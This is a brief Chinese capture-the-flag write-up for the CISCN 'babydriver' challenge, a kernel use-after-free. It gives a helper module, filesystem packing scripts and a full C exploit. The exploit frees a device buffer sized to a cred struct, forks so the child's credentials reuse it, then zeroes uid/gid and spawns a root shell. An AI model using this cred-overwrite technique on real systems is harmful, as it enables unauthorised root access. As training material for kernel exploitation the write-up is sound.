# ciscn-babydriver

比较入门的内核 uaf ，这里不仔细写 wp 了，放一下各种脚本

获得具体 cred 大小

```c
//简单modules
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>
MODULE_LICENSE("Dual BSD/GPL");
struct cred c1;
static int hello_init(void) 
{
    printk("<1> Hello world!\n");
    printk("size of cred : %d \n",sizeof(c1));
    return 0;
}
static void hello_exit(void) 
{
    printk("<1> Bye, cruel world\n");
}
module_init(hello_init);
module_exit(hello_exit);
```

打包文件系统

```shell
gcc exp.c -static -o ./fs/exp
# sudo chmod a+x c.sh
# ./c.sh
cd fs
find . | cpio -o --format=newc > ../rootfs.img
```

解包文件系统

```python
# sudo chmod a+x dec.sh
# ./dec.sh
mkdir fs
cd fs
cp ../rootfs.cpio ./rootfs.cpio.gz
gunzip ./rootfs.cpio.gz 
cpio -idmv < rootfs.cpio
rm rootfs.cpio
```

最终的 exp

```c
#include<stdio.h>
#include<fcntl.h>
#include <unistd.h>

// 需要跳出常规思维，这和用户态的pwn不一样，内核是可以执行多线程的

int main(){
    int fd1,fd2,id;
    char cred[0xa8] = {0};
    fd1 = open("dev/babydev",O_RDWR);
    fd2 = open("dev/babydev",O_RDWR);
    // 此时有两个文件描述符指向同一个设备
    // 设备中有个全局结构体,这样就有两个指针指向同一个内存

    ioctl(fd1,0x10001,0xa8);
    // 通过命令释放以前的堆块，创建 0xa8 大小的堆块
    // 此时两个文件描述符的结构体均指向了这个 0xa8 大小的堆块

    close(fd1);
    // 关闭第一个文件描述符,此时 0xa8 大小的堆块被 free 放入内核 bin 中

    id = fork();
    // 这里开了一个新线程，这个线程的 cred 结构体使用的就是刚刚放出的那个堆块
    if(id == 0){
        write(fd2,cred,28);
        // 这里向第二个文件描述符全局结构体指向的内存中写入0
        // 同时也是向这个进程的 cred 结构体，将 uid 和 gid 改成0 即为root

        if(getuid() == 0){
            printf("[*]welcome root:\n");
            system("/bin/sh");
            return 0;
        }
    }
    else if(id < 0){
        printf("[*]fork fail\n");
    }
    else{
        wait(NULL);
    }
    close(fd2);
    return 0;
}
```

